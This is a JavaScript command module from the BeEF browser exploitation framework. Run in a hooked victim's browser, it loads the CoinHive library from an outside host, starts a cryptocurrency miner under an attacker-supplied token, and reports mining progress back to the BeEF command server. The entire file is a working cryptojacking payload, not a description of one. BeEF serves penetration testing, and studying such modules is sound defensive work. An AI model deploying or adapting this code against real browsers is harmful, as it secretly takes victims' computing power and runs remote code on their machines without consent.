//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
beef.execute(function() {
  var comm_url = '<%= @command_url %>';
  var comm_id = <%= @command_id %>;

  load_script = function(url) {
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = url;
    document.body.appendChild(s);
  }

  beef.debug("[CoinHive] Loading library...");
  load_script('https://coinhive.com/lib/coinhive.min.js');

  try {
    setTimeout("mine('<%= @public_token %>', CoinHive.<%= @mode %>)", 10000);
  } catch(e) {
    beef.debug("[CoinHive] Error loading miner: " + e.message);
    beef.net.send(comm_url, comm_id, 'error=' + e.message, beef.are.status_error());
    return;
  }

  mine = function(token, mode) {
    beef.debug("[CoinHive] Starting the miner...");
    beef.net.send(comm_url, comm_id, 'result=Starting the miner');

    try {
      var miner = new CoinHive.Anonymous(token);
      miner.start(mode);
    } catch(e) {
      beef.debug("[CoinHive] Error starting miner: " + e.message);
      beef.net.send(comm_url, comm_id, 'error=' + e.message, beef.are.status_error());
      return;
    }

    miner.on('open', function() {
      beef.debug("[CoinHive] Opened connection to pool successfully");
      beef.net.send(comm_url, comm_id, 'result=Opened connection to pool successfully', beef.are.status_success());
    })
    miner.on('authed', function() {
      beef.debug("[CoinHive] Authenticated successfully");
      beef.net.send(comm_url, comm_id, 'result=Authenticated successfully', beef.are.status_success());
    })
    miner.on('error', function(params) {
      beef.debug("[CoinHive] The pool reported an error: " + params.error);
      if (params.error === 'invalid_site_key') {
        miner.stop();
        beef.net.send(comm_url, comm_id, 'error=' + params.error, beef.are.status_error());
        return;
      }
    })
    miner.on('found', function() {
      beef.debug("[CoinHive] Hash found");
    })
    miner.on('accepted', function() {
      beef.debug("[CoinHive] Hash accepted by the pool");
    })

    setInterval(function() {
      if (miner.isRunning()) {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        beef.debug("[CoinHive] Total Hashes: " + totalHashes + " -- Accepted Hashes: " + acceptedHashes + " -- Hashes/Second: " + hashesPerSecond);
      }
    }, 60000)
  }
});
